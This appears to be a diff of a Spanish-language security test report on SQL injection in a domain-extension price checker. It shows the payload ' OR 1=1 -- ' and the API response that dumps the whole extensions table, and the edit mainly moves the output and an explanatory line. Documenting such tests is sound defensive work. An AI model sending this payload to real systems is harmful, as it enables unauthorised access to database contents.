@@ -61,11 +61,6 @@ Testeamos SQLi en el verificador de extensiones de dominio.
 ' OR 1=1 -- '
 ```
 La prueba arrojó la siguiente salida:
-```md
-✓ .' OR 1=1 -- ' valida — 9.99€/ano — Tiempo: 0.01s
-API: {"estado":"ok","mensaje":"Consulta ejecutada correctamente","datos":[{"id":"1","extension":"com","precio":"9.99"},{"id":"2","extension":"net","precio":"8.99"},{"id":"3","extension":"org","precio":"7.99"},{"id":"4","extension":"es","precio":"5.99"},{"id":"5","extension":"eu","precio":"6.99"},{"id":"6","extension":"io","precio":"19.99"},{"id":"7","extension":"dev","precio":"12.99"},{"id":"8","extension":"app","precio":"14.99"}]}
-```
-La API devolvió todas las filas de la tabla, no solo una extensión:
 ```json
 {
   "estado": "ok",
@@ -82,6 +77,8 @@ La API devolvió todas las filas de la tabla, no solo una extensión:
   ]
 }
 ```
+La API devolvió todas las filas de la tabla, no solo una extensión.
+
 Desglose:
 
 | Parte | Significado |
